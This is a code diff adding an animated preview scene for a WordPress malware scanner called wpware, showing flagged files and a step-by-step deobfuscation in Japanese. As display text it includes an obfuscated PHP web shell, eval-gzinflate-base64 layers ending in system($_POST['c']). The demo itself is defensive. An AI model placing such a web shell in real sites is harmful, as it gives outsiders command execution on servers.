@@ -1,3 +1,4 @@
+import { sitePath } from '../paths'
 // Animated product scenes shown in the featured-project hover preview.
 // Plain HTML + CSS keyframes (see `.scene-*` in styles.css) so they stay crisp at any size.
 
@@ -241,5 +242,49 @@ export function TrailScene() {
         </div>
       </div>
     </div>
+  </div>
+}
+
+export function WpwareScene() {
+  const files: [string, string, string][] = [
+    ['ok', 'wp-admin/index.php', ''],
+    ['ok', 'wp-includes/version.php', ''],
+    ['ok', 'wp-includes/functions.php', ''],
+    ['bad', 'wp-includes/class-wp-hook.php', '改ざん'],
+    ['ok', 'wp-content/plugins/akismet/akismet.php', ''],
+    ['bad', 'wp-content/uploads/2026/11/favicon.ico.php', 'uploads に PHP'],
+    ['ok', 'wp-content/themes/twentytwentyfive/style.css', ''],
+    ['warn', '.htaccess', 'auto_prepend_file'],
+  ]
+  const layers: [string, string][] = [
+    ['raw', "eval(gzinflate(base64_decode('S0lNzs9JLU4tKk4tA…')));"],
+    ['base64', "gzinflate(\"\\x4b\\x49\\x4d…\")"],
+    ['gzinflate', "eval(str_rot13('flfgrz($_CBFG[\\'p\\']);'));"],
+    ['rot13', "system($_POST['c']);"],
+  ]
+  return <div className="scene scene-wpware">
+    <div className="wp-head"><img className="wp-logo" src={sitePath('/images/projects/wpware-icon.svg')} alt="" /><span>wpware scan ./public_html</span><span className="wp-ver">WordPress 6.8.3 · ja</span></div>
+    <div className="wp-body">
+      <ul className="wp-files">
+        {files.map(([kind, path, why], i) => (
+          <li key={path} className={`wp-file ${kind}`} style={{ '--i': i } as React.CSSProperties}>
+            <span className="wp-mark">{kind === 'ok' ? '✓' : kind === 'warn' ? '!' : '✕'}</span><span className="wp-path">{path}</span>{why && <span className="wp-why">{why}</span>}
+          </li>
+        ))}
+      </ul>
+      <div className="wp-deobf">
+        <p className="wp-deobf-title">favicon.ico.php をほどく</p>
+        {layers.map(([label, code], i) => (
+          <p key={label} className={`wp-layer l${i}`} style={{ '--i': i } as React.CSSProperties}><span className="wp-layer-tag">{label}</span><code>{code}</code></p>
+        ))}
+        <p className="wp-verdict">Web シェル — 外から送られた命令を実行します</p>
+      </div>
+    </div>
+    <div className="wp-report">
+      <span className="wp-sev">重大 3 件</span>
+      <span>改ざん 1 · 置き場所 1 · 設定 1</span>
+      <span className="wp-next">次にすること: 該当ファイルを控えてから、公式の版で置き換え</span>
+    </div>
+    <div className="wp-badges"><span>読むだけ</span><span>PHP を実行しない</span><span>日本語の結果</span><span>JSON · SARIF</span></div>
   </div>
 }
